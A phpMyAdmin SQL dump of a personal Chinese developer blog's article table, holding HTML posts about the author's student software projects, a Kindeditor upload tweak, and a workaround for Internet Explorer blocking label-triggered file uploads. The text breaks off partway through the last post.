-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 2016-04-30 17:26:24
-- 服务器版本： 5.6.17
-- PHP Version: 5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `qwqoffice`
--

-- --------------------------------------------------------

--
-- 表的结构 `qo_article`
--

CREATE TABLE IF NOT EXISTS `qo_article` (
  `TID` int(10) NOT NULL AUTO_INCREMENT,
  `CID` int(10) NOT NULL,
  `UID` int(10) NOT NULL,
  `Title` char(40) NOT NULL,
  `Content` text NOT NULL,
  `Time` datetime NOT NULL,
  `ClickCount` int(10) NOT NULL,
  `ArticleType` char(20) NOT NULL,
  PRIMARY KEY (`TID`),
  KEY `qo_article_ibfk_1` (`CID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `qo_article`
--

INSERT INTO `qo_article` (`TID`, `CID`, `UID`, `Title`, `Content`, `Time`, `ClickCount`, `ArticleType`) VALUES
(1, 4, 1, '基于TCP/IP协议的局域网聊天程序', '<p style="text-indent:2em;">\n	<span style="color:#009900;font-size:16px;">大一下学期的期末设计哈哈，做了两三个星期，最初的版本只有基础功能，比如登录，注册，添加好友/群，私聊，建群，群聊，还有离线消息、通知，新消息闪烁，输入状态显示等功能。后来在暑假的时候又不断地完善，加入动画效果和自动搜索服务器的功能。当然只能在局域网内使用。</span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><img alt="" src="/attached/image/20160223/aionwdbkwfhzohqs.png" /><br />\n</span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;">主界面</span><br />\n</span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;"><img alt="" src="/attached/image/20160223/coxobskzmabzbfea.png" /><br />\n</span></span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;">群聊界面</span></span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;"><img alt="" src="/attached/image/20160223/umobinqosoempjoh.png" /><br />\n</span></span> \n</p>\n<p style="text-align:center;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;">帮助界面</span></span> \n</p>\n<p style="text-align:left;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;"><span style="color:#009900;font-size:16px;">其它的截图就不放这里了。</span><br />\n</span></span> \n</p>\n<p style="text-align:left;text-indent:2em;">\n	<span style="color:#009900;font-size:16px;"><span style="color:#E53333;font-size:16px;"><span style="color:#009900;font-size:16px;">下面有源码可以下载。</span></span></span> \n</p>\n<p style="text-align:left;text-indent:2em;">\n	<span style="color:#009900;font-size:16px;"><span style="color:#E53333;font-size:16px;"><span style="color:#009900;font-size:16px;">另外有问题或建议也可以在这里发表。</span></span></span> \n</p>\n<p style="text-align:left;text-indent:2em;">\n	<span style="color:#009900;"><span style="color:#E53333;"><span style="color:#009900;"><a class="ke-insertfile" href="/download.php?aid=1"><span style="color:#003399;">Chat_20150901.zip</span></a><br />\n</span></span></span> \n</p>\n<p style="text-align:left;text-indent:2em;">\n	<br />\n</p>', '2016-02-23 15:50:15', 257, 'Product'),
(2, 7, 1, '网站BUG及建议反馈', '<p style="text-indent:2em;">\r\n	<span style="color:#E56600;font-size:16px;">本站有错误的地方</span><span style="color:#E56600;font-size:16px;">？有不满意的地方？那就来这里反馈吧。</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#E56600;font-size:16px;">任何BUG或者建议都可以在这里跟我说哦。</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#E56600;font-size:16px;">如果你有兴趣加入本站的建设，请联系我吧！</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#E56600;font-size:16px;"><strong>测试重点：</strong></span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">1、显示错误</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">2、设计逻辑错误</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">3、功能无法正常使用</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;"><br />\r\n</span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#E56600;"><span style="font-size:16px;"></span><span style="font-size:16px;color:#003399;">记得留下你的联系方式哦！</span></span>\r\n</p>', '2016-02-23 18:51:26', 3332, 'Original'),
(3, 5, 1, 'JigsawPuzzle 拼图游戏', '<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">大二上学期的期末作品，本来想拿个高分的，谁知道老师程序看都没有看，只看了文档<img src="http://www.qwqoffice.com/ke4/plugins/emoticons/images/41.gif" border="0" alt="" />。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">和一般的拼图游戏不同，这个拼图就像现实生活中的拼图一样，需要你把一块一块的小拼图拼上去。如下图：</span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><img src="/attached/image/20160224/yinalpkymzdjpnyc.png" alt="" width="700" height="372" title="" align="" /><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">直接用鼠标拖动拼图块到正确的位置！</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">分为低中高三个等级的难度，拼图数量分别为40，160，640。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">如果程序目录下有图片文件，会自动读取，最小分辨率为640*400，点击重置切换图片。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">如果在游戏中忘记原先的图片，可以点击原图查看。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">有时候导入的图片对比度不高，容易出现误以为拼图已经完成，实际上却有一两块错误的情况。这时候可以点击提示，查看拼错的地方。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">拼图完成时，自动弹出对话框，显示用时。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><span style="color:#E53333;">程序及源码下载：</span><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><span style="color:#E53333;"><span style="color:#003399;"><span style="color:#003399;"></span><a class="ke-insertfile" href="/download.php?aid=2"><span style="color:#003399;">JigsawPuzzle_20151229.zip</span></a></span><br />\r\n</span></span></span> \r\n</p>', '2016-02-24 11:22:38', 117, 'Product'),
(4, 5, 1, 'ThoughtReader 水晶球读心术', '<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">根据网上一Flash小游戏制作而成。</span></span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><img src="/attached/image/20160224/pssqatgsbfrtpeoo.png" alt="" /><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="font-size:14px;"><span style="font-size:12px;"></span><span style="color:#E53333;">主界面</span></span><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">附上Flash：</span></span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><embed src="/attached/flash/20160226/ruplcqlbadwnlyoc.swf" type="application/x-shockwave-flash" width="550" height="400" quality="high" /><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><br />\r\n</span></span>\r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">具体玩法：</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">1、心里面默想一个两位数，然后用这个两位数减去十位数字和个位数字的和。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">2、用得到的数字在右边的列表中找到对应的图案，记住这个图案。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">3、点击水晶球，你会发现显示的就是那个图案。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;color:#E53333;"><span style="color:#E53333;">程序及源码下载：</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;color:#E53333;"><span style="color:#E53333;"><a class="ke-insertfile" href="/download.php?aid=3"><span style="color:#003399;">ThoughtReader_20151215.zip</span></a><br />\r\n</span></span> \r\n</p>', '2016-02-24 13:31:12', 193, 'Product'),
(5, 5, 1, 'Hanoi 汉诺塔演示工具', '<p style="text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">之前在JAVA上写过一个递归算法的汉诺塔程序，然后就跟舍友说，给我一个上午的时间，我用图形用户界面的方式写一个动画版的，然后就有这个了。。。</span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;"><img src="/attached/image/20160227/tdstbzbvmghemarp.png" alt="" /><br />\r\n</span> \r\n</p>\r\n<p style="text-align:center;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;"><br />\r\n</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">支持设置数量：1-20，由于空间限制，多了会显示不全。<br />\r\n</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">支持设置速度：1-1000。（可在动画过程中设置）</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">支持设置三个塔的名字。</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">支持进度显示。</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">支持步骤显示。</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;font-size:16px;">可暂停。</span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<br />\r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="background-color:#E53333;"></span>\r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="background-color:;"><span style="font-size:16px;"></span><span style="color:#E53333;font-size:16px;">程序及源码下载：</span></span>\r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="background-color:;"><span style="color:#E53333;font-size:16px;"><a class="ke-insertfile" href="/download.php?aid=4"><span style="color:#003399;">Hanoi_20151015.zip</span></a><br />\r\n</span></span>\r\n</p>', '2016-02-27 22:25:29', 810, 'Product'),
(6, 7, 1, 'NewsPublisher 新闻发布系统', '<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">嗯。。。又是一个期末作品。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;">使用PHP开发的新闻发布系统。</span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<span><span style="font-size:16px;line-height:24px;"><img src="/attached/image/20160302/tdqcsowsyllxkjbz.png" alt="" width="700" height="428" title="" align="" /><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;">实现了简单的新闻发布、浏览，分类管理，后台管理员等功能。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;">实现了浏览计数，分类浏览，分页，后台新闻搜索及快捷搜索等功能。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;">后台编辑器使用经过优化的 Kindeditor 4.1.0。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;line-height:24px;color:#006600;">总之就是一个简单的内容管理系统。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span><span style="font-size:16px;line-height:24px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span><span style="font-size:16px;line-height:24px;color:#E53333;">源码下载：</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span><span style="font-size:16px;line-height:24px;color:#E53333;"><span style="color:#003399;"><a class="ke-insertfile" href="/download.php?aid=5"><span style="color:#003399;">NewsPublisher_20160106.zip</span></a></span><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span><span style="font-size:16px;line-height:24px;color:#E53333;"><br />\r\n</span></span> \r\n</p>', '2016-03-02 22:35:05', 99, 'Product'),
(7, 7, 1, 'Blown 个人博客系统', '<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;">好吧，本来做这个系统的目的只是单纯为了发布一些自己做的软件、作品什么的。正好碰上比赛，就顺便拿去参赛了。</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><strong>Blown</strong> 这个名字，其实就是Blog 和 Own 两个单词的合体，含义是Owned Your Blog——建立自己的博客。</span><br />\r\n</span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;">为什么不用现成的博客系统，原因有两个，一是别人做的东西，始终不是自己的，有时候出现什么问题还不能自己解决，自己做的就不一样，自己写的代码肯定知道哪里有问题。二是之前也用过Discuz! 这样的论坛系统，感觉有很多功能是用不到的，食之无味弃之可惜，而且还夹杂着一些广告。</span><br />\r\n</span></span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;">毕竟是自己做的东西，界面，安全什么的肯定没有大公司出来的好。不过没有最完美，只有更完美，这个系统将来也会越来越完善。</span></span></span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;"><br />\r\n</span></span></span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;">一大波图片来袭</span></span></span></span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;"><br />\r\n</span></span></span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;"><img src="/attached/image/20160329/20160329221421_89690.png" alt="" width="850" height="378" title="" align="" /><br />\r\n</span></span></span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;"><img src="http://a613827.sn25435.gzonet.net/attached/image/20160329/20160329221421_50957.png" alt="" width="850" height="378" title="" align="" /><br />\r\n</span></span></span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<span style="font-size:16px;"><span style="color:#006600;"><span style="color:#9933E5;"><span style="color:#006600;"><img src="/attached/image/20160329/20160329221422_98048.png" width="850" height="378" alt="" /><br />\r\n</span></span></span></span> \r\n</p>\r\n<p style="text-align:center;">\r\n	<img src="/attached/image/20160329/20160329221422_15355.png" width="850" height="378" alt="" /> \r\n</p>\r\n<p style="text-align:center;">\r\n	<img src="/attached/image/20160329/20160329221422_79383.png" width="850" height="378" alt="" /> \r\n</p>\r\n<p style="text-align:center;">\r\n	<img src="/attached/image/20160329/20160329221422_21903.png" width="850" height="378" alt="" /> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;"><br />\r\n</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">由于比赛还没结束，所以源代码暂时不能公布。</span></span> \r\n</p>\r\n<p style="text-align:left;text-indent:2em;">\r\n	<span style="color:#006600;"><span style="font-size:16px;">官网：<a href="http://www.qwqoffice.com" target="_blank"><span style="color:#003399;">http://www.qwqoffice.com</span></a><span style="color:#003399;"></span></span></span> \r\n</p>', '2016-03-29 22:30:02', 135, 'Product'),
(8, 9, 1, 'Kindeditor上传文件后自动将原文件名添加至文件说明中', '<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">在项目开发中，各种需求都有可能被提出来，用Kindeditor作为项目中使用的文本编辑器也是因为其功能之强大。但使用过程中遇到了各种问题，首先是开发@功能时，发现Kindeditor自带的获取光标位置函数有问题（至今还没找到解决办法，准备换百度的编辑器测试一下），然后就是今天这个需求了：文件上传后自动将原文件名添加文件说明中。</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;"><br />\r\n</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">编辑器并不自带此功能（话说这个功能真心应该加上）。如下是更改一番后的解决方案：</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">首先是更改</span><strong><span style="font-size:14px;">upload_json.php</span></strong><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">这个文件，将原文件名添加到返回数据中：</span> \r\n</p>\r\n<pre class="prettyprint linenums lang-php">echo $json-&gt;encode(array(''error'' =&gt; 0, ''url'' =&gt; $file_url));</pre>\r\n<p style="text-indent:2em;">\r\n	改为\r\n</p>\r\n<pre class="prettyprint linenums lang-php">echo $json-&gt;encode(array(''error'' =&gt; 0, ''url'' =&gt; $file_url,''origin_name''=&gt; $file_name));</pre>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">然后修改编辑器plugins文件夹中的&nbsp;</span><strong><span style="font-size:14px;">insertfile.js</span></strong><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">文件中的内容：&nbsp;</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">在if (allowFileUpload) {……}中找到&nbsp;</span><span style="font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;color:#337FE5;">urlBox.val(url);</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">&nbsp;</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;line-height:22.5px;">下面添加一行：&nbsp;</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;color:#337FE5;">titleBox.val(data.origin_name);</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">&nbsp;</span><br />\r\n<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;"><br />\r\n</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">如果想要浏览添加服务器文件时也自动填充文件名则继续修改如下内容：&nbsp;</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">在if (allowFileManager) {……}中找到&nbsp;</span><span style="font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;color:#337FE5;">K(''[name="url"]'', div).val(url);</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">&nbsp;</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">下面添加一行：&nbsp;</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;color:#337FE5;">K(''[name="title"]'', div).val(title);</span><span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">&nbsp;</span><br />\r\n<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;"><br />\r\n</span> \r\n</p>\r\n<p style="text-indent:2em;">\r\n	<span style="color:#333333;font-family:''Microsoft YaHei'', Verdana, sans-serif, 宋体;font-size:14px;line-height:22.5px;">如上变解决了自动填充文件名的问题。&nbsp;</span> \r\n</p>', '2016-03-31 23:47:48', 38, 'Repaint'),
(9, 13, 1, 'label标签 for input file IE浏览器下报拒绝访问', '<p>\r\n	1. label &nbsp;for 绑定元素响应事件，例如 点击label可以执行绑定的input 的button的事件\r\n</p>\r\n<pre class="prettyprint linenums lang-html">&lt;label for="large_icon_url" class="btn_up file-up-btn"&gt;上传大图标&lt;/label&gt;\r\n&lt;input type="file" accept="image/*" class="input_f pics" maxnums="1" name="large_icon_url" id="large_icon_url"&gt;</pre>\r\n<p>\r\n	label实现了好看的效果，但是由于ie安全限制问题，会拒绝非file浏览上传文件的访问，所以处理方法应该是让file附在lable的上面，然后是透明处理，直接点击file即可。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	2. 转上传文件的隐藏处理：\r\n</p>\r\n<p>\r\n	又是IE的一个问题，近来是跟IE浏览器磕上了，这个问题发现不少人也遇到过，实在蛋疼。但今天这个不能算是一个bug，因为IE可能是从安全角度上考虑结果导致的。一步步来解读。\r\n</p>\r\n<h3 style="font-family:''Lucida Grande'', 宋体;font-size:16px !important;color:#227700 !important;">\r\n	普通上传例子\r\n</h3>\r\n<p>\r\n	首先普通的文件上传呢，很简单，前端代码：\r\n</p>\r\n<pre class="prettyprint linenums lang-html">&lt;!DOCTYPE html&gt;\r\n&lt;html&gt;\r\n    &lt;head&gt;\r\n        &lt;meta charset="utf-8" /&gt;\r\n        &lt;title&gt;file标签隐藏&lt;/title&gt;\r\n    &lt;/head&gt;\r\n    &lt;body&gt;\r\n        &lt;form action="http://192.168.1.99/upload/upload.php" method="post" enctype="multipart/form-data"&gt;\r\n            &lt;input onchange="document.forms[0].submit();" type="file" name="file" /&gt;\r\n        &lt;/form&gt;\r\n    &lt;/body&gt;\r\n&lt;/html&gt;</pre>\r\n<p>\r\n	upload.php代码：\r\n</p>\r\n<pre class="prettyprint linenums lang-php">echo ''&lt;pre&gt;'';\r\nprint_r($_FILES["file"]);\r\necho ''&lt;/pre&gt;'';</pre>\r\n<p>\r\n	其实就是打印获取到的文件信息。我们测试一下，选择文件后，提交到PHP页面结果如下：\r\n</p>\r\n<p>\r\n	Array\r\n</p>\r\n<p>\r\n	(\r\n</p>\r\n<p>\r\n	&nbsp; &nbsp;[name] =&gt; 7.jpg\r\n</p>\r\n<p>\r\n	&nbsp; &nbsp;[type] =&gt; image/jpeg\r\n</p>\r\n<p>\r\n	&nbsp; &nbsp;[tmp_name] =&gt; /tmp/php0VkjPG\r\n</p>\r\n<p>\r\n	&nbsp; &nbsp;[error] =&gt; 0\r\n</p>\r\n<p>\r\n	&nbsp; &nbsp;[size] =&gt; 36297\r\n</p>\r\n<p>\r\n	)\r\n</p>\r\n<p>\r\n	能正确获取文件信息，只需要cp下就能保存。\r\n</p>\r\n<h3 style="font-family:''Lucida Grande'', 宋体;font-size:16px !important;color:#227700 !important;">\r\n	用别的按钮替代file标签\r\n</h3>\r\n<p>\r\n	但是默认file标签很难看，而且每个浏览器下都有很大差距。因此我们基本都把真正的file标签给隐藏，然后创建一个标签来替代它，比如我们创建一个a标签来替代它，隐藏file标签，单击a标签时触发file标签click弹出选择文件窗口。最终页面代码如下：\r\n</p>\r\n<pre class="prettyprint linenums lang-html">&lt;!DOCTYPE html&gt;\r\n&lt;html&gt;\r\n    &lt;head&gt;\r\n        &lt;meta charset="utf-8" /&gt;\r\n        &lt;title&gt;file标签隐藏&lt;/title&gt;\r\n    &lt;/head&gt;\r\n    &lt;body&gt;\r\n        &lt;form action="http://192.168.1.99/upload/upload.php" method="post" enctype="multipart/form-data" style="display:none;"&gt;\r\n            &lt;input onchange="document.forms[0].submit();" type="file" name="file"  /&gt;\r\n        &lt;/form&gt;\r\n        &lt;a onclick="document.forms[0].file.click();" href="javascript:void(0);" &gt;上传文件&lt;/a&gt;\r\n    &lt;/body&gt;\r\n&lt;/html&gt;</pre>\r\n<p>\r\n	页面上就只看见a标签\r\n</p>\r\n<p>\r\n	<img src="/attached/image/20160401/20160401001320_85264.jpg" alt="" /> \r\n</p>\r\n<p>\r\n	点击“上传文件”弹开选择文件的窗口\r\n</p>\r\n<img src="/attached/image/20160401/20160401001400_18685.jpg" alt="" /> \r\n<p>\r\n	选择文件后，正确传送文件信息到服务器\r\n</p>\r\n<img src="/attached/image/20160401/20160401001429_27371.jpg" alt="" /> \r\n<p>\r\n	这样就完成文件上传了，这个操作在Chrome，FireFox下都正常，IE下有问题。\r\n</p>\r\n<h3 style="font-family:''Lucida Grande'', 宋体;font-size:16px !important;color:#227700 !important;">\r\n	IE不能上传文件\r\n</h3>\r\n<p>\r\n	IE下也能正常弹开选择文件的窗口\r\n</p>\r\n<img src="/attached/image/20160401/20160401001515_41316.jpg" alt="" /> \r\n<p>\r\n	但选择文件后，却不能上传，同时还报一个“拒绝访问”错误，如截图中红圈部分\r\n</p>\r\n<img src="/attached/image/20160401/20160401001544_30175.jpg" alt="" /> \r\n<h3 style="font-family:''Lucida Grande'', 宋体;font-size:16px !important;color:#227700 !important;">\r\n	解决IE下不能上传文件的问题\r\n</h3>\r\n<p>\r\n	其实这是IE安全限制问题，没有点击file的浏览按钮选择文件都不让上传，既然IE非得要亲自点击，我们可以变通一下，让自定义按钮存在又能真正点击到file标签。<span style="color:#E53333;">解决方案是让file标签盖在a标签上，但file是透明的，这样用户看到的是a标签的外观，实际点击是file标签。</span>如图：\r\n</p>\r\n<img src="/attached/image/20160401/20160401001636_61659.jpg" alt="" /> \r\n<p>\r\n	最终页面代码如下：\r\n</p>\r\n<pre class="prettyprint linenums lang-html">&lt;a style="position:relative;display:block;width:100px;height:30px;background:#EEE;border:1px solid #999;text-align:center;"  href="javascript:void(0);" &gt;上传文件\r\n    &lt;form action="http://192.168.1.99/upload/upload.php" method="post" enctype="multipart/form-data"&gt;\r\n        &lt;input style="position:absolute;left:0;top:0;width:100%;height:100%;z-index:999;opacity:0;" onchange="document.forms[0].submit();" type="file" name="file"  /&gt;\r\n    &lt;/form&gt;\r\n&lt;/a&gt;</pre>\r\n<p>\r\n	页面：\r\n</p>\r\n<img src="/attached/image/20160401/20160401001734_74406.jpg" alt="" /> \r\n<p>\r\n	需要注意几个问题\r\n</p>\r\n<p>\r\n	<strong>1、取消a标签onclick事件，因为实际上已经不需要a标签的onclick触发file的click了，而是直接就点击到file；</strong> \r\n</p>\r\n<p>\r\n	